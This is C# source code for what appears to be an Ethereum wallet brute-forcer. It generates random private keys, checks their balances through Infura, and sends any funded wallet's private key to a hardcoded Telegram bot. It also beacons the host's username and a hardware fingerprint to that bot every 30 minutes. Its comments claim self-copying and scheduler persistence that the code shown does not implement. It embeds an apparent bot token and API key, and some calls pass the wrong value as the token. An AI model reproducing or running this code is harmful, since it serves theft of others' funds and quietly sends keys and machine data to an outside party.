using Nethereum.Contracts.Standards.ERC20.TokenList;
using Nethereum.KeyStore;
using Nethereum.Signer;
using Nethereum.Web3;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Threading;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Utilities.Net;
using System.IO;
using System.Security.Cryptography;

namespace ERC20_Generate
{
    internal class Program
    {
        public static int count;
        public static string tokenTG = "5888693856:AAEh9wmO_1C-LIQzAq6ljiK8GKpPYta40Nk";
        public static string UserIDSchat = "5983277008";
        public static string API_URL_infura_io = "https://mainnet.infura.io/v3/915dd827e0564578b17944727dcf79ae"; // https://mainnet.infura.io/v3/91dfgdfg827e0564578b17944727dc12313
        static void Main(string[] args)
        {

            List<Thread> AutoStart = new List<Thread>();
            AutoStart.Add(new Thread(() => Bananas().Wait())); // Копируемся в рабочию директорию
            AutoStart.Add(new Thread(() => Time())); // Прописываемся в планировщик

            foreach (Thread t in AutoStart)
                t.Start();
        }
        static private async Task Bananas()
        {
            SSL.GetSSL();

            try
            {
                var web3 = new Web3(API_URL_infura_io);

                EthECKey key = EthECKey.GenerateKey();

                string privateKey = key.GetPrivateKey();
                string address = key.GetPublicAddress();
                var keyStore = new KeyStoreScryptService();

                var balance = await web3.Eth.GetBalance.SendRequestAsync(address);
                var etherAmount = Web3.Convert.FromWei(balance.Value);

                if (etherAmount != 0)
                {
                    Get(UserIDSchat, UserIDSchat, address, privateKey, etherAmount.ToString());
                }

                count++;
            }
            catch { }
            Bananas().Wait();
        }
        public static void Get(string id, string token, string address, string privateKey, string etherAmount) // TGBot.Get(id, token);
        {
            try
            {
                SSL.GetSSL();
                WebClient WebClient = new WebClient();
                WebClient.DownloadString(@"https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + id + "&text=" +
                "🎁🎉 Найдет кошелек с балансом на боте " + Environment.UserName.ToString() + " - " +  HWID.Get() + "🎉🎁\n" +
                "💎 Balance: <code>" + etherAmount + "</code>\n" +
                "💰 Wallet: <code>" + address + "</code>\n" +
                "🔐 Private Key: <code>" + privateKey + "</code>\n" +
                "⌛️ Всего бот проверил: <code>" + count.ToString() + "</code> Wallet's" + "&parse_mode=html");
            }
            catch { }
        }

        public static void Time() // TGBot.Get(id, token);
        {
            while (true)
            {
                if (count == 0)
                {
                    SSL.GetSSL();
                    WebClient WebClient = new WebClient();
                    WebClient.DownloadString(@"https://api.telegram.org/bot" + UserIDSchat + "/sendMessage?chat_id=" + UserIDSchat + "&text=👤 Бот начал работу, следующий отчет через 30 минут!\n" +
                    Environment.UserName.ToString() + " - " + HWID.Get()+ "\n");
                }
                else
                {
                    SSL.GetSSL();
                    WebClient WebClient = new WebClient();
                    WebClient.DownloadString(@"https://api.telegram.org/bot" + UserIDSchat + " / sendMessage?chat_id=" + UserIDSchat + "&text=📊 ОТЧЕТ: " +
                    Environment.UserName.ToString() + " - " + HWID.Get() + "\n" +
                    "⌛️ Всего бот проверил: <code>" + count.ToString() + "</code> Wallet's" + "&parse_mode=html");
                }
                Thread.Sleep(1800000);
            }
        }
    }

    class HWID
    {
        public static string Get()
        {
            try
            {

                int n;
                string s = GetHash(Environment.ProcessorCount.ToString() + Environment.UserName + "ex" + Environment.OSVersion + Environment.MachineName + new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize), s1;
                n = GetHash(s).Length;
                s1 = s.Substring(2, n - 2);
                return s1;
            }
            catch
            {
                return "Error_HWID";
            }
        }

        public static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 20).ToUpper();
        }
    }
}
